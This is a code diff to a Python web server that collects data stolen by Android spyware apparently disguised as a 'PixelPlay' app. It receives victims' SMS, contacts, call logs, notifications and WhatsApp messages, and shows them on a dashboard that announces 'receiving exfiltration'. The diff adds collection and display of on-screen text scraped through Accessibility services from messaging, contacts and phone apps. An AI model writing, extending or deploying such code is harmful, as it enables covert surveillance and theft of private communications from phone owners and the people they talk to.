@@ -330,15 +330,16 @@ class Handler(BaseHTTPRequestHandler):
             ln = int(self.headers.get('Content-Length', 0))
             d = json.loads(self.rfile.read(ln).decode())
             with data_lock:
-                for k in ['device','sms','contacts','call_logs','notifications','whatsapp']:
+                for k in ['device','sms','contacts','call_logs','notifications','whatsapp','accessibility']:
                     if k in d: received_data[k] = d[k]
                 received_data['active'] = True
                 received_data['last_update'] = datetime.now().strftime('%H:%M:%S')
             wc = len(d.get('whatsapp', []))
             dv = d.get('device', {})
+            acc_count = len(d.get('accessibility', []))
             print(f"\n[{datetime.now().strftime('%H:%M:%S')}] DATA!")
             print(f"  {dv.get('manufacturer','')} {dv.get('model','')} ({dv.get('android','')})")
-            print(f"  SMS:{len(d.get('sms',[]))} Contacts:{len(d.get('contacts',[]))} Calls:{len(d.get('call_logs',[]))} WhatsApp:{wc}")
+            print(f"  SMS:{len(d.get('sms',[]))} Contacts:{len(d.get('contacts',[]))} Calls:{len(d.get('call_logs',[]))} WhatsApp:{wc} Screen:{acc_count}")
             if wc:
                 for m in d.get('whatsapp', [])[:3]:
                     print(f"  WA: {m.get('title','')}: {m.get('text','')[:60]}")
@@ -406,10 +407,19 @@ class Handler(BaseHTTPRequestHandler):
         act = d.get('active', False)
         sms = d.get('sms', [])
         wa = d.get('whatsapp', [])
+        acc = d.get('accessibility', [])
         last = d.get('last_update', '—')
         s = "" if not act else "<div style='background:#1A4A2A;color:#00E676;padding:12px;border-radius:12px;margin-bottom:16px;text-align:center'> DATA ACTIVE — receiving exfiltration</div>"
         wa_rows = "".join(f"<div class='msg wa'><b>{m.get('title','')}</b><br/>{m.get('text','')}</div>" for m in wa[-20:])
         sms_rows = "".join(f"<div class='msg'><b>{m.get('addr','?')}</b><br/>{m.get('body','')}</div>" for m in sms[-20:])
+        acc_rows = ""
+        for a in acc[-20:]:
+            pkg = a.get('package', '')
+            texts = a.get('texts', [])
+            preview = '<br/>'.join(texts[:15])
+            label = {'com.google.android.apps.messaging':'SMS App','com.whatsapp':'WhatsApp','com.android.contacts':'Contacts',
+                     'com.android.dialer':'Phone','com.android.phone':'Phone'}.get(pkg, pkg)
+            acc_rows += f"<div class='msg acc'><b>{label}</b><br/>{preview}</div>"
         return f"""<!DOCTYPE html>
 <html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
 <title>PixelPlay Dashboard</title><style>
@@ -421,8 +431,10 @@ h1{{color:#6C63FF;margin-bottom:20px}}
 @media(max-width:800px){{.gr{{grid-template-columns:1fr}}}}
 .msg{{background:#0D0D0D;padding:10px;border-radius:8px;margin-bottom:6px;border-left:3px solid #6C63FF;font-size:13px}}
 .msg.wa{{border-left-color:#25D366}}
+.msg.acc{{border-left-color:#FF6B35}}
 .msg b{{color:#6C63FF;font-size:12px}}
 .msg.wa b{{color:#25D366}}
+.msg.acc b{{color:#FF6B35}}
 .none{{color:#505070;font-style:italic;text-align:center;padding:20px}}
 .tm{{color:#8080A0;font-size:14px}}
 </style></head><body>
@@ -433,12 +445,15 @@ h1{{color:#6C63FF;margin-bottom:20px}}
   <span class='tm'>Last: {last}</span>
   <span class='tm'>SMS: {len(sms)}</span>
   <span class='tm'>WhatsApp: {len(wa)}</span>
+  <span class='tm'>Screen: {len(acc)}</span>
 </div>
-<div class='gr'>
+<div class='gr' style='grid-template-columns:1fr 1fr 1fr'>
   <div class='cd'><h3 style='color:#6C63FF;margin-bottom:8px'>WhatsApp</h3>
     {wa_rows if wa_rows else '<div class="none">No WhatsApp yet</div>'}</div>
   <div class='cd'><h3 style='color:#6C63FF;margin-bottom:8px'>SMS</h3>
     {sms_rows if sms_rows else '<div class="none">No SMS yet</div>'}</div>
+  <div class='cd'><h3 style='color:#FF6B35;margin-bottom:8px'>Screen Capture</h3>
+    {acc_rows if acc_rows else '<div class="none">No screen data yet — open Messages/Contacts/Phone with Accessibility enabled</div>'}</div>
 </div>
 <a href='/' class='db mt4 tm' style='color:#6C63FF'>← Back to site</a>
 </body></html>"""
